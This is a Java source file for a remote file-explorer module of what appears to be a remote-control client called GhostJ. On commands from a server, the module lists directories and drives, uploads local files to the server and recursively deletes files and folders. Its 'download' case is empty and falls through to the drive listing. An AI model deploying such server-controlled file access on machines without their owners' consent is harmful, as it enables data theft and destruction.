package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.cmd.CommandProcessException;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.core.Processor;

import javax.swing.*;
import java.io.File;
import java.util.Arrays;
import java.util.HashMap;

/**
 * 读取文件列表和操作文件
 * Rock's File Explorer
 * @author Rock Chin
 */
public class FuncRFE implements AbstractFunc {
	public static String currentDir=".";//rfe 目前指向的目录
	public static String homePath=".";
	public static boolean linkToCmd=false;
	static {
		currentDir=System.getProperty("user.dir")+"\\";
		homePath=System.getProperty("user.dir")+"\\";
	}
	@Override
	public String getFuncName() {
		return "!!rfe";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params...]"};
	}

	@Override
	public String getDescription() {
		return "get files info";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		switch (params[0]){
			case "dir":{
				File crtDir=new File(currentDir);
				if(!crtDir.exists()){
					sendError("noSuchDir");
				}else if (!crtDir.isDirectory()){
					sendError("notADir");
				}else {
					File[] crtLs = crtDir.listFiles();
					StringBuffer lsStr=new StringBuffer("!reDir "+currentDir);
					if (crtLs==null){
						lsStr.append("\n");
					}else {
						for (File file : crtLs) {
							String name0="<ERROR>";
							try {
								name0=file.getName().replaceAll("!","*");
							}catch (Exception ignored){}
							boolean isdir=false;
							try {
								isdir=file.isDirectory();
							}catch (Exception ignored){}
							long len=-1;
							try{
								len=file.length();
							}catch (Exception ignored){}
							lsStr.append("|"+name0+":"+isdir+":"+len);
						}
						lsStr.append("\n");
					}
					HandleConn.writeToServerIgnoreException(lsStr.toString());
				}
				break;
			}
			case "cd":{
				if (params.length<2){
					return;
				}
				if (params[1].equals("%GHOSTJ_HOME%")){
					changeDirLoop(homePath);
				}else {
					changeDirLoop(params[1].replaceAll("\\?", " ").replaceAll("\\*", "!"));
				}
				HandleConn.writeToServerIgnoreException("!cd "+currentDir+"\n");
				break;
			}
			case "upload": {
				//rftx还没适配先使用rft先
				if (params.length < 3) {
					sendError("illegalParam");
					break;
				}
				if (!new File(currentDir + File.separatorChar + params[1].replaceAll("\\?"," ").replaceAll("\\*","!")).exists()){
					sendError("noSuchFile");
					break;
				}
				try {
					processor.start("!!rft upload "+(currentDir+params[1]).replaceAll(" ","?")+" "+params[2]);
				} catch (CommandProcessException e) {
					sendError("cannotUpload:"+ ClientMain.getErrorInfo(e));
				}
				break;
			}
			case "download":{

			}
			case "dsk":{
				StringBuffer result=new StringBuffer("!dsk ");
				for (char ds='A';ds<='Z';ds++){
					if(new File(ds+":\\").exists()){
						result.append(ds);
					}
				}
				result.append("\n");
				HandleConn.writeToServerIgnoreException(result.toString());
				break;
			}
			case "del":{
				if (params.length<2){
					break;
				}
				File file=new File(currentDir+params[1].replaceAll("\\?"," ").replaceAll("\\*","!"));
				deleteDir(file.getAbsolutePath());
				try {
					processor.start("!!rfe dir");
				} catch (CommandProcessException e) {
					e.printStackTrace();
				}
				break;
			}
			case "link":{
				if (params.length>1){
					try{
						linkToCmd=Boolean.parseBoolean(params[1]);
					}catch (Exception e){}
				}else {
					linkToCmd=!linkToCmd;
				}
				HandleConn.writeToServerIgnoreException("linkToCmd:"+linkToCmd);
				break;
			}
		}
		HandleConn.sendFinishToServer();
	}
	public void sendError(String errMsg){
		HandleConn.writeToServerIgnoreException("!rfeError:"+errMsg+"\n");
	}

	public String arrayToString(String[] arr,int start,int end,String sep){
		StringBuffer result=new StringBuffer();
		for(int i=start;i<end;i++){
			result.append(arr[i]+sep);
		}
		return result.toString();
	}

	/**
	 * 解析一个路径并添加到crtDir里
	 * @param to 要添加的路径
	 */
	public void changeDirLoop(String to){
		//是绝对路径吗
		if (isAbsPath(to)){
			currentDir=to;
			return;
		}else{
			String spt[]=to.split("\\\\");
			//是..吗
			if (spt[0].equals("..")){
				String[] dirSpt=currentDir.split("\\\\");
				//还能向上一级吗
				if (dirSpt.length<=1){
					return;
				}else {
					currentDir = arrayToString(dirSpt, 0, dirSpt.length - 1, File.separator);
				}
			}else {
				if (new File(currentDir+spt[0]).exists())
					currentDir += spt[0]+(spt[0].endsWith("\\")?"":"\\");
				else {
					sendError("noSuchDir:"+currentDir+spt[0]);
					return;
				}
			}
			//之后还有吗
			if(spt.length>1){
				changeDirLoop(arrayToString(spt,1,spt.length,"\\"));
			}
		}
	}
	public boolean isAbsPath(String path){
		char[] arr=path.toCharArray();
		return arr.length > 1 && arr[1] == ':';
	}
	public void changeCmdDir(){
		
	}
	public static void deleteDir(String dirPath)
	{
		File file = new File(dirPath);
		if(file.isFile())
		{
			HandleConn.writeToServerIgnoreException("del file-"+file.delete()+":"+file.getName()+"\n");
		}else
		{
			File[] files = file.listFiles();
			if(files == null)
			{
				HandleConn.writeToServerIgnoreException("del dir-"+file.delete()+":"+file.getName()+"\n");
			}else
			{
				for (int i = 0; i < files.length; i++)
				{
					deleteDir(files[i].getAbsolutePath());
				}
				HandleConn.writeToServerIgnoreException("del dir-"+file.delete()+":"+file.getName()+"\n");
			}
		}
	}
}
